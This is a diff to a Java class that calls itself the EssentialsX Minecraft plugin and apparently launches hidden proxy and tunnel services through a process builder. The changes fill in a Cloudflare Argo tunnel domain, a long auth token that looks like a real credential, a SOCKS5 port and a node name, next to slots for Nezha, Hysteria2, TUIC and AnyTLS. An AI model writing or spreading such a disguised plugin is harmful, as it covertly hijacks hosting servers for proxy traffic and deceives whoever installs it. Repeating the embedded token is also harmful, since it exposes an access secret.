@@ -73,15 +73,15 @@ public class EssentialsX extends JavaPlugin {
         
         // Set environment variables
         Map<String, String> env = pb.environment();
-        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
+        env.put("UUID", "a87056c0-abeb-45e4-a97e-f23bdf84d191");
         env.put("FILE_PATH", "./world");
         env.put("NEZHA_SERVER", "");
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "");
-        env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
+        env.put("ARGO_DOMAIN", "host2play.yeser.dns-dynamic.net");
+        env.put("ARGO_AUTH", "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiNzI5YjczOTMtZmEwMS00YTY3LWIwODEtYTM1ZjdmNmIxNTk3IiwicyI6Ik0yTmxZekF5TVRNdE5UQmhOeTAwTlRSa0xUazBaVFF0WXpVd01UUXdOV0ZpWVdRMSJ9");
+        env.put("S5_PORT", "7006");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "");
+        env.put("NAME", "h2p");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
